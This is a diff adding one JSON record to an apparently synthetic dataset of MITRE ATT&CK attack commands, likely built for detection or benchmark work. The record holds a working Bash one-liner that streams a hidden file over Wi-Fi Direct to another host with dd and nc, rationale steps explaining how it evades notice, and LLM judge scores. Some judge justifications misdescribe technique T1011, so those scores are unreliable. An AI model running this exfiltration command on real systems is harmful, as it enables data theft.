@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i p2p-wlp2s0-0 -nn udp port 55303 -U -w /dev/null >/dev/null 2>&1 & dd if=/var/tmp/.sdata bs=64k 2>/dev/null | nc -u -s 192.168.49.1 192.168.49.2 55303",
+  "explanation": "Streams a data file over Wi\u2011Fi Direct (p2p interface) using UDP on an uncommon port while silently monitoring that port. This is exfiltration over an alternate wireless medium in line with T1011.",
+  "rationale_steps": [
+    "Use the Wi\u2011Fi Direct interface to bypass the primary WLAN.",
+    "Send via UDP on port 55303 to avoid standard services.",
+    "Run tcpdump scoped to the p2p interface and port, discarding output.",
+    "Pipe dd output into nc, binding to the P2P source IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-370f7eb0",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash line with proper backgrounding, piping, redirections, and valid-looking flags/filters.",
+        "semantic_score": 3,
+        "semantic_justification": "The dd|nc pipeline plausibly exfiltrates data over a Wi-Fi Direct UDP path, but this does not match 'physical medium' exfiltration as described for T1011 and tcpdump likely requires elevated privileges, undermining the claimed monitoring step.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T08:55:13.362002Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators, balanced quoting, valid flags for all tools used (tcpdump, dd, nc), and correct redirection syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements exfiltration over a physical medium (Wi-Fi Direct) by monitoring a specific UDP port with tcpdump while simultaneously using dd to read data and nc to transmit it over that same port to another device on the wireless network.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:55:16.640815Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid tools, flags, operators, and redirection for Bash, making it perfectly well-formed and parseable.",
+        "semantic_score": 1,
+        "semantic_justification": "The command describes exfiltration over a wireless medium, which fundamentally contradicts the MITRE ATT&CK T1011 'Exfiltration Over Physical Medium' technique, and the `tcpdump` component would fail without elevated privileges.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:55:40.396629Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
